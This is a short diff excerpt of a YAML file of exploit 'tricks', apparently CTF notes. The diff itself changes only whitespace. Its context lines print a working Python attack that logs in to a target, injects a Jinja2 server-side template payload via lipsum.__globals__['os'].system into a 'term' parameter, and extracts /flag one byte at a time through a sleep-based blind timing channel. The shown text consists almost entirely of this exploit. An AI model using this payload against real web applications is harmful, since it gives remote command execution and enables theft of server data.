@@ -50,10 +50,9 @@ tricks:
     payload: |
       s = requests.Session()
       s.post(f"{TARGET}/login", data={"username": "test", "password": "test"})
-      
+
       for pos in range(1, 80):
           # Binary search for ASCII value at position
           cmd = f"test $(head -c{pos} /flag | tail -c1 | od -An -td1) -gt {mid} && sleep 1"
           payload = f"lipsum.__globals__['os'].system('{cmd}') or 1"
           s.get(f"{TARGET}/amortization", params={"term": payload})
-
